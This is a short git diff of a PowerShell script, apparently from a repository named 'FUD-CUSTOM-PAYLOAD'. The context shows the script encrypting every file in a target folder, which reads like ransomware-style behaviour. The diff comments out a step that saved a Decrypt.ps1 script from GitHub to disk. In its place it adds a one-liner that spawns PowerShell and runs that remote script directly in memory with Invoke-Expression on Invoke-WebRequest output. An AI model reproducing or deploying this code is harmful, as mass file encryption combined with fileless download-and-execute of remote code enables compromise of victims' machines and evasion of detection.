@@ -64,11 +64,12 @@ Get-ChildItem -Path $folderPath -File | ForEach-Object {
     Encrypt-File -FilePath $_.FullName -EncryptionMethod $encryptionMethod
 }
 
-# Define the URL of the raw script on GitHub for Decrypt.ps1
-$decryptScriptUrl = "https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/Decrypt.ps1"
+# # Define the URL of the raw script on GitHub for Decrypt.ps1
+# $decryptScriptUrl = "https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/Decrypt.ps1"
 
-# Define the local path where you want to save Decrypt.ps1
-$decryptScriptPath = Join-Path -Path $folderPath -ChildPath "Decrypt.ps1"
+# # Define the local path where you want to save Decrypt.ps1
+# $decryptScriptPath = Join-Path -Path $folderPath -ChildPath "Decrypt.ps1"
 
-# Download the Decrypt.ps1 script from GitHub
-Invoke-WebRequest -Uri $decryptScriptUrl -OutFile $decryptScriptPath
+# # Download the Decrypt.ps1 script from GitHub
+# Invoke-WebRequest -Uri $decryptScriptUrl -OutFile $decryptScriptPath
+powershell start powershell -A 'Invoke-Expression (Invoke-WebRequest -Uri https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/Decrypt.ps1).Content'
